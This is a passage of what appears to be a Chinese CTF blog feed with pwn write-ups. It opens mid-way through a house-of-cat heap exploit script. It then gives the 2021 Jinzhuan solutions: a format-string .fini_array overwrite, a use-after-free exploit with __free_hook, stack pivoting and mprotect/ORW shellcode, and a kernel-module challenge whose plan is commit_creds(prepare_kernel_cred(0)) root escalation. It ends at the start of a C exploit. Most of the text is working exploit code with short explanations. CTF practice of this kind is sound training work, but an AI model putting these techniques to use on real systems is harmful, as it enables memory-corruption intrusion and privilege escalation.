当chunk的fd的第一个字节为0时需要使用这种方法获取libc地址</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x430</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>)+<span class="hljs-string">&#x27;a&#x27;</span>)<br>    show()<br>    p.read(<span class="hljs-number">9</span>)<br>    main_arena=u64((<span class="hljs-string">b&#x27;\x00&#x27;</span>+p.read(<span class="hljs-number">6</span>)[<span class="hljs-number">1</span>:]).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x60</span><br>    edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x430</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    main_arena=u64(data[:data.find(<span class="hljs-string">&#x27;\x7f&#x27;</span>)+<span class="hljs-number">1</span>])-<span class="hljs-number">0x60</span><br><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>top_chunk=main_arena+<span class="hljs-number">0x60</span><br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>func_table=libc.address+<span class="hljs-number">0x1e35c8</span><br>arg_table=libc.address+<span class="hljs-number">0x1eb218</span><br>io_list_all=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x8ef80</span><br><br><br>add(<span class="hljs-number">0x428</span>)<br><br><br>fake_io_add=fake_heap+<span class="hljs-number">0x440</span>+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x450</span>+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x30</span><br><br>fake_io=p64(<span class="hljs-number">0x68732f6e69622f</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(system)+p64(system)+\<br>    p64(system+<span class="hljs-number">1</span>)+p64(system+<span class="hljs-number">3</span>)+p64(system+<span class="hljs-number">2</span>)+\<br>    p64(system+<span class="hljs-number">5</span>)+p64(<span class="hljs-number">0</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+\<br>    p16(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(fake_io_add+<span class="hljs-number">0x8</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)*<span class="hljs-number">20</span>+\<br>    p64(wfile_jump+<span class="hljs-number">0x30</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(fake_io_add)<br><span class="hljs-comment"># 构造 house of cat需要的IO结构体</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    让原先指向的overflow变成_IO_wfile_seekoff</span><br><span class="hljs-string">    然后让_wide_data-&gt;vtable-&gt;overflow变成system函数</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>c_l=[]<br><span class="hljs-comment">## edit printf_function_table ##</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x440</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x441</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x450</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x451</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x500</span>)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,p64(func_table-<span class="hljs-number">0x20</span>),off=<span class="hljs-number">0x28</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x500</span>)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,p64(fake_heap)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,p64(fake_heap+<span class="hljs-number">0x440</span>+<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">0x438</span>)<br><br><br><span class="hljs-comment">## edit printf_arginfo_table ##</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,p64(arg_table-<span class="hljs-number">0x20</span>),off=<span class="hljs-number">0x28</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,p64(fake_heap)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,p64(fake_heap+<span class="hljs-number">0x440</span>+<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">0x438</span>)<br><br><span class="hljs-comment">## edit io_list_all ##</span><br>edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x440</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x441</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,p64(io_list_all-<span class="hljs-number">0x20</span>),off=<span class="hljs-number">0x28</span>)<br>free(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,p64(fake_heap+<span class="hljs-number">0x440</span>+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x450</span>+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x10</span>,p64(fake_heap+<span class="hljs-number">0x440</span>+<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>,off=<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">0x438</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-built_in">len</span>(fake_io),fake_io)<br><br><span class="hljs-comment">## click assert ##</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x700</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,p64(top_chunk-<span class="hljs-number">0x20</span>),off=<span class="hljs-number">0x28</span>)<br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,p64(gadget),off=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;s&#x27;</span>)*<span class="hljs-number">8</span>+<span class="hljs-number">16</span>)<br><br>add(<span class="hljs-number">0x700</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    如果top chunk+size没有与0x1000对齐时会调用malloc_assert</span><br><span class="hljs-string">    在malloc_assert中会调用fvprintf</span><br><span class="hljs-string">    在fvprintf函数中，如果printf_function_table中存在数据就会执行printf_arginfo_table表中对应的函数</span><br><span class="hljs-string">    在构造之后就是执行IO_cleanup函数</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021金砖-pwn</title>
    <link href="/page/wp/2021%E9%87%91%E7%A0%96-pwn/"/>
    <url>/page/wp/2021%E9%87%91%E7%A0%96-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="pmagic1">pmagic1</h2><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pmagic.jpg" srcset="/img/loading.gif" lazyload alt="main函数" title="main函数"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p,gadget</span>):<br>    libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>    p.sendafter(<span class="hljs-string">&quot;name.\n&quot;</span>,<span class="hljs-string">&#x27;%43$p&#x27;</span>)<br>    libc.address=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;Say&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">240</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    payload=<span class="hljs-string">b&#x27;&#x27;</span><br>    fini=<span class="hljs-number">0x600a78</span><br>    off=<span class="hljs-number">8</span><br>    gadget=libc.address+gadget<br>    pg=p64(gadget)<br>    p_d=&#123;&#125;<br>    p_l=[]<br>    off=<span class="hljs-number">8</span>+<span class="hljs-number">12</span><br>    <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(pg):<br>        p_d[v]=off+i<br>        p_l.append(v)<br>    p_l.sort()<br><br><br>    <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(p_l):<br>        <span class="hljs-keyword">if</span> v:<br>            payload+=(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(v-p_l[i-<span class="hljs-number">1</span>])+<span class="hljs-string">&#x27;c%&#x27;</span>+<span class="hljs-built_in">str</span>(p_d[v])+<span class="hljs-string">&#x27;$hhn&#x27;</span>).encode()<br>        <span class="hljs-keyword">else</span>:<br>            payload+=(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(p_d[v])+<span class="hljs-string">&#x27;$hhn&#x27;</span>).encode()<br>    payload=payload.ljust(<span class="hljs-number">96</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        payload+=p64(fini+i)<br>    p.sendlineafter(<span class="hljs-string">&#x27;something.\n&#x27;</span>,payload)<br>    p.interactive()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&quot;./pmagic&quot;</span>)<br>        pwn(p,i)<br>        p.close()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure><h2 id="pwn2">pwn2</h2><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn2.jpg" srcset="/img/loading.gif" lazyload alt="main" title="main"></p><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn2-1.jpg" srcset="/img/loading.gif" lazyload alt="create" title="create"></p><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn2-2.jpg" srcset="/img/loading.gif" lazyload alt="delete" title="delete"></p><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn2-3.jpg" srcset="/img/loading.gif" lazyload alt="edit" title="edit"></p><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn2-4.jpg" srcset="/img/loading.gif" lazyload alt="show" title="show"></p><p><code>delete</code>函数中存在UAF，且<code>create</code>函数中可以创建较大的chunk，所以获取libc地址很简单，但是程序禁用了<code>execve</code>系统调用，所以需要使用<code>orw</code>获取<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sla=<span class="hljs-keyword">lambda</span> a,b:p.sendlineafter(a,b)<br>sa=<span class="hljs-keyword">lambda</span> a,b:p.sendafter(a,b)<br>sl=<span class="hljs-keyword">lambda</span> a:p.sendline(a)<br>ru=<span class="hljs-keyword">lambda</span> a:p.readuntil(a)<br>rd=<span class="hljs-keyword">lambda</span> a:p.read(a)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">b&quot;\n&quot;</span></span>):<br>    sla(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;description&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">&#x27;description&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    sa(<span class="hljs-string">&#x27;description&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    <span class="hljs-keyword">return</span> rd(<span class="hljs-number">6</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">att</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    gdb.attach(p,cmd)<br>    pause()<br><br>p=process(<span class="hljs-string">&#x27;./orw_h2&#x27;</span>,)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x78</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x78</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x78</span>) <span class="hljs-comment">#3</span><br><br>free(<span class="hljs-number">0</span>)<br><br>free(<span class="hljs-number">1</span>)<br>c_0=u64(show(<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x10</span><br>success(<span class="hljs-string">&quot;chunk_0: &quot;</span>+<span class="hljs-built_in">hex</span>(c_0))<br><br>free(<span class="hljs-number">2</span>)<br>d=u64(show(<span class="hljs-number">2</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_address: &quot;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br><br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>rdi=libc.address+<span class="hljs-number">0x23b72</span><br>rsi=libc.address+<span class="hljs-number">0x2604f</span><br>rdx=libc.address+<span class="hljs-number">0x119241</span><br>leave=libc.address+<span class="hljs-number">0x5587e</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leave))<br><br>gadget=libc.address+<span class="hljs-number">0x154d0a</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    可以修改rbp的值，达到栈迁移</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,c_0+<span class="hljs-number">0x10</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,c_0+<span class="hljs-number">0x10</span>,<span class="hljs-number">0x30</span>)<br>op_s=asm(shellcode)<br>op_s=op_s+<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x10</span>-(<span class="hljs-built_in">len</span>(op_s)&amp;<span class="hljs-number">0xf</span>))<br>shell_add=c_0+<span class="hljs-number">0x80</span>+<span class="hljs-number">0x80</span>+<span class="hljs-number">0x10</span><br><br>rop_add=shell_add+<span class="hljs-built_in">len</span>(op_s)<br><br>rop=flat([<br>    leave,<br>    rdx,<br>    <span class="hljs-number">0</span>,<br>    rop_add-<span class="hljs-number">0x28</span>,<br>    rdi,shell_add&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    rsi,<span class="hljs-number">0x1000</span>,<br>    rdx,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<br>    mprotect,<br>    shell_add<br>    ])<br><br>add(<span class="hljs-number">0x438</span>,op_s+rop) <span class="hljs-comment">#4</span><br>edit(<span class="hljs-number">1</span>,p64(free_hook))<br>chunk_data=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">9</span>+p64(rop_add)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rop_add))<br>success(<span class="hljs-string">&quot;free_hook: &quot;</span>+<span class="hljs-built_in">hex</span>(free_hook))<br><br>add(<span class="hljs-number">0x78</span>,chunk_data) <span class="hljs-comment">#5 2</span><br><br><br>add(<span class="hljs-number">0x78</span>,p64(gadget)) <span class="hljs-comment">#6 free_hook</span><br>free(<span class="hljs-number">5</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn3">pwn3</h2><h3 id="启动脚本分析">启动脚本分析</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#boot.sh</span><br><span class="hljs-comment">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -kernel ./bzImage \<br>    -initrd  ./rootfs.cpio \<br>    -monitor /dev/null \<br>    -append <span class="hljs-string">&quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet nokaslr&quot;</span> \<br>    -cpu kvm64 \<br>    -smp cores=2,threads=1 \<br>    -netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>    -nographic<br>    <span class="hljs-comment"># 开启系统时没有随机地址</span><br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#/etc/rcS</span><br><span class="hljs-comment">#!/bin/sh</span><br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br><span class="hljs-built_in">mkdir</span> -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br><span class="hljs-built_in">chmod</span> 666 /dev/ptmx<br><span class="hljs-built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms<br><span class="hljs-comment"># 我们可以通过/tmp/kallsyms文件获取commit_creds与prepare_kernel_cred函数地址</span><br><span class="hljs-comment"># 如果可以构造commit_creds(prepare_kernel_cred(0))就可以获得root权限</span><br><span class="hljs-comment"># 因为prepare_kernel_cred(0) 是创建一个拥有特殊权限的用户的cred结构体</span><br><span class="hljs-comment"># commit_creds 是将当前用户的cred设置为参数cred结构体</span><br><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict<br><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br><span class="hljs-built_in">chown</span> root:root /flag<br><span class="hljs-built_in">chmod</span> 400 /flag<br><br>insmod baby.ko<br><span class="hljs-built_in">chmod</span> 777 /dev/chardev0<br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><h3 id="分析">分析</h3><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn3.jpg" srcset="/img/loading.gif" lazyload alt="chardev_init" title="chardev_init"></p><blockquote><p>这里注册了一个设备<code>chardev</code>，并且会在<code>/dev</code>目录下创建名为chardev0的设备</p></blockquote><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn3-2.jpg" srcset="/img/loading.gif" lazyload alt="chardev_exit" title="chardev_exit"></p><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn3-3.jpg" srcset="/img/loading.gif" lazyload alt="chardev_ioctl" title="chardev_ioctl"></p><blockquote><p>当我们对打开的/dev/chardev的文件句柄进行ioctl操作时会执行这个函数</p></blockquote><p><img src="/img/blog_img/2021%E9%87%91%E7%A0%96/2021%E9%87%91%E7%A0%96-pwn-pwn3-1.jpg" srcset="/img/loading.gif" lazyload alt=""><br>可以看到内核中的地址都是可读可写可执行的，而在<code>chardev_ioctl</code>函数中，存在任意地址写入，而且每次开启内核中的地址都不变，那么可以修改<code>chardev_ioctl</code>函数中<code>else</code>部分的代码为<code>commit_creds(prepare_kernel_cred(0))</code>，然后正常返回，之后在用户态调用<code>system(&quot;/bin/sh&quot;);</code>就可以查看<code>flag</code>文件了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* exp */</span><br><span 